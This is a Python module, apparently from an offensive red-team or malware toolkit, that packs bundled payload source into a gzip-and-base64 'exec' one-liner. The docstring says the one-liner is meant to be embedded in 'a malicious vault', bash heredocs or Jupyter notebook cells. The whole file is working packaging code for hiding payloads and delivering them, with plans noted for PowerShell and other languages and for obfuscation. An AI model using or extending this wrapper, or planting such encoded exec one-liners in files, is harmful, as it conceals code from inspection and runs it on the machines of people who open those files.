"""Pluggable per-language wrappers for vessel-ready command generation.

A vessel wrapper transforms bundled source bytes into a one-liner command string
that can be embedded in a delivery mechanism (e.g., inside a malicious vault,
bash heredoc, Jupyter notebook cell) and executed as a system command.

The Python gzip+base64 wrapper is the default and produces platform-agnostic
output that works across Python 3.x versions. Future wrappers may support other
languages (Ruby, Bash, PowerShell) or alternative Python encodings (marshal+b64
for bytecode-specific benefits like faster execution or obfuscation).

All intermediate transformation artifacts are preserved for debugging.
"""

from __future__ import annotations

import base64
import gzip
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Any


@dataclass
class WrapperArtifacts:
    """Intermediate artifacts produced during vessel wrapping.

    Attributes:
        ready_string: The final one-liner command string ready for embedding.
        intermediate_files: Dict of filename → bytes for all transformation stages.
        metadata: Dict of transformation metadata (sizes, compression_ratio, format).
    """

    ready_string: str
    intermediate_files: dict[str, bytes]
    metadata: dict[str, Any]


class VesselWrapper(ABC):
    """Base class for language-specific vessel wrappers."""

    @abstractmethod
    def wrap(self, source_bytes: bytes) -> WrapperArtifacts:
        """Transform source into a vessel-ready command string.

        Args:
            source_bytes: The bundled payload source (flattened .py for Python).

        Returns:
            WrapperArtifacts containing the ready string, intermediate files,
            and transformation metadata.
        """


class PythonGzipB64Wrapper(VesselWrapper):
    """Python wrapper using gzip + base64 encoding.

    Produces a platform-agnostic one-liner that works across Python 3.x versions:

        python3 -c "import gzip,base64;exec(gzip.decompress(base64.b64decode(b'...')))"

    The transformation pipeline:
        1. gzip.compress(source) → compressed bytes (~55% reduction for SDK payloads)
        2. base64.b64encode(compressed) → ASCII-safe string (+33% expansion)
        3. Wrap in one-liner shell command template

    Intermediate files:
        - bundled.py: Raw flattened source
        - bundled.gz: gzip-compressed source
        - bundled.b64: base64-encoded compressed bytes
    """

    def wrap(self, source_bytes: bytes) -> WrapperArtifacts:
        # 1. Compress
        compressed = gzip.compress(source_bytes)

        # 2. Base64 encode
        b64_bytes = base64.b64encode(compressed)
        b64_str = b64_bytes.decode("ascii")

        # 3. Generate one-liner command
        # Note: The b'...' literal is required (not "...") because base64.b64decode
        # expects bytes, not str. The outer quotes are " to allow shell expansion.
        ready = (
            f'python3 -c "import gzip,base64;'
            f'exec(gzip.decompress(base64.b64decode(b\'{b64_str}\')))"'
        )

        # 4. Collect intermediate files
        intermediate = {
            "bundled.py": source_bytes,
            "bundled.gz": compressed,
            "bundled.b64": b64_bytes,
        }

        # 5. Record transformation metadata
        metadata = {
            "source_size": len(source_bytes),
            "compressed_size": len(compressed),
            "b64_size": len(b64_bytes),
            "compression_ratio": len(compressed) / len(source_bytes) if source_bytes else 0.0,
            "format": "python_gzip_b64",
        }

        return WrapperArtifacts(
            ready_string=ready,
            intermediate_files=intermediate,
            metadata=metadata,
        )


# Registry for language-specific wrappers. Future: 'ruby', 'bash', 'powershell'.
WRAPPERS: dict[str, type[VesselWrapper]] = {
    "python": PythonGzipB64Wrapper,
}
